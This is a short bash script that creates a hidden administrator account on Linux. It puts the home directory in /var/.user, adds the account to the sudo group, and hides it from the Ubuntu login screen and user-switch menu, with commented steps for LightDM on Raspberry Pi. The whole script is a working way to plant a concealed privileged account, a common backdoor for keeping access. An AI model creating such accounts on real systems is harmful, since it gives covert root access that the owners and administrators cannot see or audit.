#author: fazlerabbi37

#hidden_user.sh

#the purpose of the shell script is to create a hidden user

#!/bin/bash


#function hidden_user makes a admin user a home directory in / and hides it form login prompt
function hidden_user () {

    #TODO detect distro
	user_name=user

	#add user with hidden home directory
	sudo useradd -m -d /var/.$user_name $user_name

	#create password for user
	sudo passwd $user_name

	#add user to sudoers
	sudo usermod -aG sudo $user_name

    #TODO fo this if Ubuntu
	#hide from login screen
	touch $user_name
	printf "[User]\nSystemAccount=true\n" > $user_name
	sudo mv $user_name /var/lib/AccountsService/users/$user_name

	#TODO do this if Ubuntu and has unity
    #hide user from logout/switch
	gsettings set com.canonical.indicator.session user-show-menu false

    #TODO if Raspberry Pi
    #chnage the /etc/lightdm/lightdm.conf file to hide user from login prompt
    #sudo sed -i '/greeter-hide-users=false/c\greeter-hide-users=true' /etc/lightdm/lightdm.conf
    #sudo sed -i '/autologin-user=pi/c\#autologin-user=pi' /etc/lightdm/lightdm.conf
}

#function are_you_sudo check if the user has sudo privilege or not
#if the user has sudo  privilege call hidden_user function or exit
function are_you_sudo () {

	#try to make a file in root directory and save error log on log file
	sudo touch /test.txt 2>log

	#save error log data on err_log variable
	err_log=$(<log)

	#remove log file
	rm log

	#check if err_log variable is empty or not; will be empty is sudo because file will be created in root directory
	if [[ ! -z $err_log ]]
	then
		echo "You don't have sudo privilege.."
		echo "Exiting script...."
	else
		echo "You have sudo privilege."
		#remove test.txt form root directory
		sudo rm /test.txt
		hidden_user
	fi
}

are_you_sudo
